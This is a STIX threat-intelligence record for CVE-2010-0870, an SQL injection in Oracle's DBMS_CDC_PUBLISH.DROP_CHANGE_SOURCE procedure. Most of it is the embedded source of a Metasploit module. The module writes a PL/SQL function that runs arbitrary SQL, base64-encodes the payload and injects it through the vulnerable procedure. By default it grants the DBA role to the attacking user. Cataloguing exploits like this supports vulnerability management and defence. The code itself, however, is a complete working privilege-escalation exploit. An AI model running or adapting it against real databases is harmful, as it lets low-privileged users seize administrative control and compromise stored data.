{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4f2c1849-3236-4f7a-aa7a-167f11fd2ad8",
    "created": "2024-08-14T16:22:06.757736Z",
    "modified": "2024-08-14T16:22:06.757741Z",
    "name": "Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE",
    "description": " The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/oracle/dbms_cdc_publish2.rb",
            "external_id": "dbms_cdc_publish2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0870"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2010.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE',\n      'Description'    => %q{\n        The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE\n        procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege\n        on the vulnerable package can exploit this vulnerability. By default, users granted\n        EXECUTE_CATALOG_ROLE have the required privilege.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-0870' ],\n          [ 'OSVDB', '63772'],\n          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2010.html' ]\n        ],\n      'DisclosureDate' => '2010-04-26'))\n\n      register_options(\n        [\n          OptString.new('SQL', [ false, 'SQL to execute.', \"GRANT DBA TO #{datastore['DBUSER']}\"]),\n        ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    var1  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    var2  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n\n    function = \"\nCREATE OR REPLACE FUNCTION #{name}\nRETURN VARCHAR2 AUTHID CURRENT_USER\nIS\nPRAGMA AUTONOMOUS_TRANSACTION;\nBEGIN\nEXECUTE IMMEDIATE '#{datastore['SQL']}';\nCOMMIT;\nRETURN NULL;\nEND;\n    \"\n\n    package = \"\nBEGIN\nSYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE('''||'||user||'.#{name}||''');\nEND;\n    \"\n\n    uno  = Rex::Text.encode_base64(function)\n    dos  = Rex::Text.encode_base64(package)\n\n    encoded_sql = %Q|\nDECLARE\n#{var1} VARCHAR2(32767);\n#{var2} VARCHAR2(32767);\nBEGIN\n#{var1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{uno}')));\nEXECUTE IMMEDIATE #{var1};\n#{var2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));\nEXECUTE IMMEDIATE #{var2};\nEND;\n    |\n\n    print_status(\"Attempting sql injection on SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE...\")\n    prepare_exec(encoded_sql)\n    print_status(\"Done...\")\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-26"
}